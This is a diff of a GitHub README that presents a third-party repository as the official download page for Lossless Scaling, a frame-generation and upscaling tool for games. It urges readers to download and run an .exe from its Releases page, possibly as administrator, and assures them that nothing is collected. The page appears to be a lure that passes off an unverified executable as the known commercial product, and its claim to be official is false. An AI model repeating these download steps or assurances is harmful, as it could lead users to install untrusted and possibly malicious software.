@@ -1,107 +1,177 @@
-<img width="1194" height="337" alt="image" src="https://github.com/user-attachments/assets/54a07f39-c48e-4db5-a226-f4e2e45fb5f1" />
+# 🎮 Lossless-Scaling-v3.22-Upscale-FPS-On-Windows - Smooth Gameplay with Higher FPS
 
-
-<img width="1536" height="1024" alt="20260305_1758_Превью Lossless-Scaling_remix_01kjzjc9zmezmstv7q9s74gher(1)" src="https://github.com/user-attachments/assets/5482719e-b41f-4071-9b4d-55005076849b" />
-
-# 🟨 Lossless Scaling – Boost PC Gaming Performance with Frame Generation & Upscaling
-
-Lossless Scaling is a powerful **PC gaming performance tool** designed to improve FPS, enable **frame generation**, and upscale games to higher resolutions without significant quality loss. It is widely used by gamers who want **smoother gameplay**, **higher frame rates**, and better performance in demanding titles.
-
-This tool is perfect for **low-end PCs**, **mid-range gaming systems**, or anyone who wants to **increase FPS in games**, reduce stuttering, and enjoy a smoother gaming experience.
+[![Download Lossless Scaling](https://img.shields.io/badge/Download-Lossless%20Scaling-32CD32?style=for-the-badge)](https://github.com/Leonderge/Lossless-Scaling-v3.22-Upscale-FPS-On-Windows)
 
 ---
 
-## 🟨 Features
+## 📋 What is Lossless Scaling?
 
-- ⚡ **Frame Generation Technology** – Increase FPS in games even if they don't support DLSS or FSR.
-- 🖥 **Advanced Upscaling Algorithms** – Play games in higher resolution with minimal quality loss.
-- 🎮 **Works With Most Games** – Compatible with many modern and classic PC games.
-- 🚀 **Performance Boost** – Improve game smoothness and reduce frame drops.
-- 🧠 **Low System Usage** – Optimized to run efficiently without heavy CPU/GPU load.
-- 🔧 **Easy Setup** – Simple interface and quick configuration.
+Lossless Scaling is a tool designed to improve your PC gaming experience. It uses frame generation and AI upscaling to increase your frame rate and enhance the clarity of your game's graphics. This process makes gameplay feel smoother and more responsive. The software works with a wide range of games, especially those that benefit from higher frames per second (FPS) and better visual quality.
 
----
+The main goal of this software is to help you:
 
-## 🟨 Why Use Lossless Scaling
-
-Many games do not support technologies like **DLSS**, **FSR**, or **XeSS**, which can limit performance on weaker hardware. Lossless Scaling provides a solution by allowing **software-based frame generation and scaling**, helping players achieve:
-
-- Higher FPS
-- Reduced input lag
-- Better performance on older GPUs
-- Smoother gameplay experience
-
-Common use cases include:
-
-- **Boost FPS in PC games**
-- **Improve gaming performance**
-- **Frame generation for unsupported games**
-- **Upscale 720p / 1080p games to higher resolutions**
-- **Optimize gaming on low-end PCs**
+- Double your FPS for smoother motion.
+- Boost game visuals without losing quality.
+- Run better on both low-end and high-end PCs.
 
 ---
 
-## 🟨 System Requirements
+## 🎯 Key Features
 
-Minimum requirements to run Lossless Scaling:
-
-- **OS:** Windows 10 / Windows 11  
-- **CPU:** Dual-core processor or higher  
-- **RAM:** 4 GB or more  
-- **GPU:** Any modern GPU supporting DirectX 11+  
-
----
-
-## 🟨 Installation Guide
-
-Follow these steps to install the program:
-
-1. **Download the archive** from the repository.
-2. Locate the downloaded `.zip` or `.rar` file.
-3. **Right-click the archive**.
-4. Select **Extract Here** or **Extract to folder** using:
+- **3 Frame Generation (LSFG 3):** Creates extra frames by predicting motion between existing frames. This results in smoother animation without hardware upgrades.
+- **AI Upscaling:** Uses artificial intelligence to sharpen and scale game images without blur or distortion.
+- **GPU Optimization:** Works efficiently with your graphics card to minimize performance drain.
+- **Multiple Scaling Modes:** Supports integer and non-integer scaling to fit different screen sizes.
+- **Easy to Use:** Simple interface suitable for users without technical knowledge.
+- **Low System Overhead:** Designed not to interfere with other running applications.
+- **Settings tailored for gaming:** Adjustable options for frame rate, scaling, and quality.
 
 ---
 
-## 🟨 How to Use
+## 🖥️ System Requirements
 
-1. Start **Lossless Scaling**.
-2. Launch your game in **windowed or borderless window mode**.
-3. Select the desired **scaling method**.
-4. Enable **frame generation** if available.
-5. Apply the settings and enjoy smoother gameplay.
+Before installing Lossless Scaling, make sure your PC meets these minimum requirements:
+
+- **Operating System:** Windows 10 (64-bit) or later.
+- **Graphics Card:** NVIDIA or AMD GPU with support for DirectX 11 or higher.
+- **Processor:** Intel i5 or equivalent AMD CPU.
+- **RAM:** 8 GB or more.
+- **Disk Space:** At least 200 MB free.
+- **Display:** A monitor that supports 1080p or higher resolution.
+
+For better performance, especially with higher resolutions like 4K, a stronger GPU and CPU are recommended.
 
 ---
 
-lossless scaling  
-lossless scaling download  
-lossless scaling app  
-lossless scaling software  
-lossless scaling frame generation  
-lossless scaling settings  
-lossless scaling guide  
-lossless scaling tutorial  
-lossless scaling pc gaming  
+## 🚀 Getting Started
 
-pc gaming performance optimization  
-improve fps in games  
-how to increase fps in games  
-pc gaming performance guide  
-windows gaming performance tips  
-optimize pc for gaming  
+Follow these steps to download, install, and run Lossless Scaling on your Windows PC.
 
-frame generation technology  
-software frame generation  
-frame interpolation gaming  
-increase frame rate pc games  
+---
 
-game upscaling software  
-resolution scaling pc gaming  
-upscale games to higher resolution  
-pc display scaling tool  
+## ⬇️ Download and Install
 
-optimize low end pc gaming  
-gaming performance tips pc  
-how to run games smoothly on pc  
-pc gaming optimization guide
+1. **Visit the Download Page**
 
+   Click the big button below to go to the official download page on GitHub. This page contains the latest software version and installation instructions.
+
+   [![Download Lossless Scaling](https://img.shields.io/badge/Download-Lossless%20Scaling-FF4500?style=for-the-badge)](https://github.com/Leonderge/Lossless-Scaling-v3.22-Upscale-FPS-On-Windows)
+
+2. **Find the Latest Release**
+
+   On the GitHub page, locate the "Releases" section. Look for the most recent version labeled something like `v3.22` or newer.
+
+3. **Download the Installer**
+
+   Download the executable file ending with `.exe`. This is the installer you will run to set up the application.
+
+4. **Run the Installer**
+
+   After downloading, double-click the `.exe` file to start the installation. Follow the on-screen instructions. You usually can accept the default settings.
+
+5. **Finish Installation**
+
+   When the installation completes, you will see a confirmation message. You might be offered to launch the software right away. Otherwise, find it in your Start menu.
+
+---
+
+## ⚙️ Configuring Lossless Scaling
+
+Once installed, launch the program from the Start menu or desktop shortcut.
+
+1. **Select Your Game or Application**
+
+   Lossless Scaling will show a list of running games or allow you to browse to the game's folder.
+
+2. **Choose Scaling Mode**
+
+   Pick the scaling method that fits your screen size and preference:
+
+   - **Integer Scaling:** Best for pixel-perfect scaling, no blur.
+   - **Non-Integer Scaling:** Allows more flexible resizing but may introduce slight blur.
+   - **AI Upscaling:** Enhances the image quality using AI.
+
+3. **Adjust Frame Rate Options**
+
+   Enable frame generation to increase FPS. Use the settings to balance smoothness and performance.
+
+4. **Start the Scaling**
+
+   Click "Start" to apply settings. You can switch back anytime by closing the software or stopping the effect.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- If the software does not detect your game, make sure the game runs in windowed or borderless mode.
+- Restart your PC if Lossless Scaling does not start properly.
+- Update your graphics drivers for better compatibility.
+- Run Lossless Scaling as an administrator if you experience permission issues.
+- Check if other screen capture or overlay software interferes. Close them temporarily.
+- Use the official GitHub page to get updates or report issues.
+
+---
+
+## 🔧 Additional Information
+
+- Lossless Scaling works best with games that are not locked at low frame rates.
+- It may not boost frame rates in older games with fixed rendering pipelines.
+- Using AI upscaling may increase GPU load, so adjust settings as needed.
+- The software includes keyboard shortcuts for quick toggling during gameplay.
+- You can configure it to start with Windows for convenience.
+
+---
+
+## 🎯 Topics and Technologies
+
+Lossless Scaling uses technology related to:
+
+- 4K upscaling
+- Frame generation
+- Integer and non-integer scaling
+- GPU optimization
+- Game performance tuning
+- Smoother gameplay on low-end PCs
+
+---
+
+## 🔗 Useful Links
+
+- Official GitHub repository and download page:  
+  https://github.com/Leonderge/Lossless-Scaling-v3.22-Upscale-FPS-On-Windows
+
+- Check for updates on the Releases page on GitHub.
+
+- For support or bug reports, visit the Issues section on the same GitHub page.
+
+---
+
+## ⚠️ System Security and Permissions
+
+Running Lossless Scaling requires:
+
+- Permission to capture and process your screen.
+- Access to detect and modify certain game outputs.
+
+Grant these permissions carefully. The software does not collect personal data.
+
+---
+
+## 💡 Tips for Best Results
+
+- Use a wired internet connection during setup for stable downloads.
+- Close unnecessary background apps before running Lossless Scaling.
+- Experiment with scaling and frame generation settings to find balance.
+- Use fullscreen borderless mode in games for better performance.
+
+---
+
+## 🔄 Updating the Software
+
+Keep your version of Lossless Scaling current by:
+
+- Visiting the GitHub Releases page regularly.
+- Downloading the latest `.exe` installer when a new version appears.
+- Running the new installer to replace the old version.
+
+Updating helps fix bugs and sometimes improves speed and compatibility.
